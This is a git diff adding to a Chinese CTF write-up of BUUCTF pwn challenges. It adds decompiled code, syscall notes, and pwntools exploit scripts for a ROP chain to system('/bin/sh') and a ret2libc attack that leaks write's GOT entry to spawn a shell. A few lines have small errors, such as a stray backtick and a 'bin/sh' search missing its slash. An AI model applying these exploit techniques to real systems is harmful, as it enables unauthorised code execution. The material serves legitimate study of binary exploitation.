@@ -89,7 +89,7 @@ p.interactive()
 
 有一个很好用的pwntools语法：
 
-`fmtstr_payload(number,{addr:value})`
+### `fmtstr_payload(number,{addr:value})`
 
 - `number`表示偏移字节数，`addr`为你要写入的地址，`value`为你要更改为的数值
 
@@ -189,7 +189,7 @@ p.interactive()
 
 ## 11 ciscn_2019_c_1
 
-ret2libc，加密的地方可以溢出，可以在输入的地方输入一个'\0'绕开加密过程
+ret2libc，加密的地方可以溢出，**可以在输入的地方输入一个'\0'绕开加密过程**
 
 ```python
 from pwn import*
@@ -325,4 +325,173 @@ payload2 = asm(shellcraft.sh())
 p.sendline(payload2)
 p.interactive()
 ```
+
+### int mprotect(void *addr, size_t len, int prot);  (NX保护绕过)
+
+- **void *addr**：目标内存区域的起始地址，**必须按页对齐**（对齐到系统页大小）
+  - **页**是操作系统管理内存的最小单位，大小通常为4KB(4096字节)或2MB(64位某些情况下的大页内存），页对齐是指内存地址必须是页大小的整数倍
+- **size_t len**
+  - 要修改权限的内存区域长度，**必须是页大小的整数倍**
+- **int prot**：权限标志位，通过位掩码组合
+  - PROT_READ(可读)
+  - PROT_WRITE(可写）
+  - PROT_EXEC(可执行)
+- 返回值：
+  - 成功：返回`0`
+  - 失败：返回`-1`，并设置`errno`
+
+## 14 [HarekazeCTF2019]baby_rop
+
+ROP构造
+
+```python
+from pwn import *
+p = process('./pwn')
+elf = ELF('./pwn')
+
+system_addr = elf.sym['system']
+binsh = 0x601048
+pop_rdi = 0x400683
+ret = 0x400479`0
+
+payload = b'a'*0x10+b'b'*0x8+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr)
+p.sendline(payload)
+p.interactive()
+```
+
+## 15 others_shellcode
+
+我没看明白这题想干嘛，反正直接nc就getshell了，那就这样吧，似乎是直接进行了...
+
+## 16 [OGeek2019]babyrop
+
+感觉这题有些难度，稍微讲一下吧
+
+`checksec`一下
+
+```shell
+❯ checksec pwn
+[*] '/home/pwn/pwn/buuctf/16/pwn'
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+```
+
+可以看到没有`canary`保护
+
+看一下主函数怎么说：
+
+```c
+int __cdecl main()
+{
+  int buf; // [esp+4h] [ebp-14h] BYREF
+  char v2; // [esp+Bh] [ebp-Dh]
+  int fd; // [esp+Ch] [ebp-Ch]
+
+  sub_80486BB();
+  fd = open("/dev/urandom", 0);
+  if ( fd > 0 )
+    read(fd, &buf, 4u);
+  v2 = sub_804871F(buf);
+  sub_80487D0(v2);
+  return 0;
+}
+```
+
+在fd大于0的时候会读取数据，来到`sub_804871F`里看看
+
+```c
+int __cdecl sub_804871F(int a1)
+{
+  size_t v1; // eax
+  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF
+  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF
+  ssize_t v5; // [esp+4Ch] [ebp-Ch]
+
+  memset(s, 0, sizeof(s));
+  memset(buf, 0, sizeof(buf));
+  sprintf(s, "%ld", a1);
+  v5 = read(0, buf, 0x20u);
+  buf[v5 - 1] = 0;
+  v1 = strlen(buf);
+  if ( strncmp(buf, s, v1) )
+    exit(0);
+  write(1, "Correct\n", 8u);
+  return (unsigned __int8)buf[7];
+}
+```
+
+可以发现在`if (strncmp(buf, s, v1))`函数这里，如果`s`和`buf`的长度不一样就会退出程序
+
+**但是这个函数本质上和`strlen`一样，在判断的字符串前加上`\x00`就直接跳过了，所以我们在输入的垃圾字符第一位加上`\x00`就行**
+
+可以看到函数会将`buf`这个`char`型数组的`buf[7]`传出来给v2，再传递给`sub_80487D0(v2)`
+
+去`sub_80487D0(v2)`里看看
+
+```c
+ssize_t __cdecl sub_80487D0(char a1)
+{
+  char buf[231]; // [esp+11h] [ebp-E7h] BYREF
+
+  if ( a1 == 127 )
+    return read(0, buf, 0xC8u);
+  else
+    return read(0, buf, a1);
+}
+```
+
+可以看到这个里面的`read`读取数据的大小取决于传入的`a1`(其实就是`v2`，也就是`buf[7]`)
+
+所以我们将`buf[7]`取到它的最大值（'\xff')，这个时候就可以通过溢出来构造`ret2libc`
+
+### **ssize_t write(int fd, const void *buf, size_t count);**
+
+- **fd**:文件描述符，代表要写入的目标
+  - **0**：标准输入（通常不用于写入）
+  - **1**：标准输出（默认输出到终端）
+  - **2**：标准错误（默认输出到终端）
+- **const void *buf**:指向待写入数据的缓冲区指针
+- **size_t count**:要写入的字节数（从`buf`中读取的字节数）
+  - 如果`count`为0，不会写入数据，但仍会检查文件描述符的有效性
+- **返回值:**
+  - 成功：返回实际写入的字节数
+  - 失败：返回`-1`，并设置`error`标识错误类型
+
+```python
+from pwn import *
+from LibcSearcher import *
+context(log_level='debug')
+libc=ELF('./libc-2.23.so')	# 题目描述里有下载libc-2.23.so的网址
+p=process('./pwn')
+#p=remote('node5.buuoj.cn',27450)
+elf=ELF('./pwn')
+ret=0x08048502
+payload='\x00'+'\xff'*7
+p.sendline(payload)
+
+write_plt=elf.plt["write"]
+write_got=elf.got["write"]
+main_addr=0x08048825
+p.recvuntil("Correct\n")
+payload1=b'a'*0xe7+b'a'*4+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(8)
+# 		溢出+覆盖+根据plt调用+返回main地址+wirte第一个参数+wirte第二个参数+write第三个参数
+p.sendline(payload1)
+write_addr=u32(p.recv(4))
+
+libc_base=write_addr-libc.sym['write']
+log.info("libc_base:"+hex(libc_base))
+bin_sh_addr=libc_base+next(libc.search(b'bin/sh'))
+system_addr=libc_base+libc.sym['system']
+
+p.sendline(payload)
+p.recvuntil("Correct\n")
+payload2=b'a'*0xe7+b'a'*4+p32(system_addr)+p32(0)+p32(bin_sh_addr)
+p.sendline(payload2)
+p.interactive()
+```
+
+
 
